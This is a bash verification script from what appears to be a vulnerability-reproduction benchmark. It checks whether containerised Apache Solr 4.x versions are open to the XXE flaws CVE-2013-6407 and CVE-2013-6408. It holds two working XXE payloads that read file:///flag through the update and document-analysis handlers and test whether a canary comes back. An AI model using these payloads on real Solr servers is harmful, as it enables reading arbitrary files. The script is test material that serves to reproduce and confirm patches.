#!/usr/bin/env bash
# verify.sh --seed|--residual — apache-solr-cve-2013-6408（真实 Solr 4.x / 外部 HTTP XXE）
#   seed     = CVE-2013-6407 原形：POST /solr/collection1/update (XMLLoader)，v0(4.0.0) 触发 / v1(4.1.0) 被 EmptyEntityResolver 阻止
#   residual = CVE-2013-6408 残留：POST /solr/collection1/analysis/document (DocumentAnalysisRequestHandler)，
#              该 handler 在 4.1.0 未套用同样防护（SOLR-4881 "overlooked while committing SOLR-3895"）→ v1 仍触发
# 效果通道 = Solr HTTP 响应 body 出现 RUN_FLAG（canary 由 entrypoint 写入容器 /flag，XXE file:///flag 读出并反射回响应）
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

# 宿主端口：docker compose port（带 profile）优先；compose.env 回退；不再用 18980 硬编码
if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
SVC="$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" 8983 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}";;
    v1) PORT="${PORT_V1_0:-}";;
    v2) PORT="${PORT_V2_0:-}";;
  esac
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve Solr host port for $VERSION" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
# 就绪探测：/solr/ 返回 200（Jetty 启动较慢，最多等 150s）
"$PY" - "$PORT" <<'PYEOF' || { echo "readiness probe failed on port $PORT" >&2; exit 20; }
import sys, time, urllib.request, urllib.error
port = sys.argv[1]
deadline = time.time() + 150
while time.time() < deadline:
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/solr/", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF

# 候选：seed 走 XMLLoader(/update)，residual 走 DocumentAnalysisRequestHandler(/analysis/document)
if [[ "$MODE" == "--seed" ]]; then
  CAND='{"id": "cve-2013-6407-xmlloader-xxe", "handler": "xmlloader", "payload": "<?xml version=\"1.0\"?><!DOCTYPE add [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]><add><doc><field name=\"id\">pcb-xxe</field><field name=\"pcb_i\">&xxe;</field></doc></add>"}'
else
  CAND='{"id": "cve-2013-6408-documentanalysis-xxe", "handler": "docanalysis", "payload": "<?xml version=\"1.0\"?><!DOCTYPE docs [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]><docs><doc><field name=\"id\">&xxe;</field></doc></docs>"}'
fi
# seed_exec.py 的 flag 取值：PCB_X || PCB_FLAG
export PCB_X="$RUN_FLAG"
OUT="$(printf '%s' "$CAND" | "$PY" "$CASE_DIR/poc/seed_exec.py" /dev/stdin "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == '$RUN_FLAG' else 10)" "$OUT"
